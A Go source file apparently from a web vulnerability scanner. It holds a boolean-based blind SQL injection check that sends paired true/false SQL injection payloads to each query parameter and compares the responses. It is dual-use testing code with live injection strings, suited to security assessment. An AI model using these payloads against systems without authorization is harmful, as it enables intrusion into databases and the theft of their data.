package blind_injection

import (
	"fmt"
	"io"
	"math/rand"
	"time"
)

var falseQ = "' AND %d=%d -- "
var trueQ = "' OR %d=%d -- "

func (b *Blind) BooleanBased() (injectable bool, payload string) {
	for i := 0; i < len(b.QParameters); i++ {
		if injectable, payload = b.boolParamCheck(i); injectable {
			return true, payload
		}
	}

	return
}

func (b *Blind) boolParamCheck(param int) (bool, string) {
	res, unsuccessPayload, err := b.makeRequest(param, falseQuery())
	if err != nil {
		return false, ""
	}

	fSize := res.ContentLength
	if fSize == -1 {
		content, err := io.ReadAll(res.Body)
		if err != nil {
			return false, ""
		}
		fSize = int64(len(content))
	}
	fStatus := res.StatusCode

	res, successPayload, err := b.makeRequest(param, trueQuery())
	if err != nil {
		return false, ""
	}

	tSize := res.ContentLength
	if tSize == -1 {
		content, err := io.ReadAll(res.Body)
		if err != nil {
			return false, ""
		}
		tSize = int64(len(content))
	}
	tStatus := res.StatusCode

	if tStatus == fStatus && fSize == tSize {
		return false, ""
	}

	return true, fmt.Sprintf("%s\n%s", successPayload, unsuccessPayload)
}

func trueQuery() string {
	r := rand.New(rand.NewSource(time.Now().Unix()))
	d := r.Uint64()
	return fmt.Sprintf(trueQ, d, d)
}

func falseQuery() string {
	r := rand.New(rand.NewSource(time.Now().Unix()))
	d1 := r.Uint64()
	d2 := d1 + 3
	return fmt.Sprintf(falseQ, d1, d2)
}
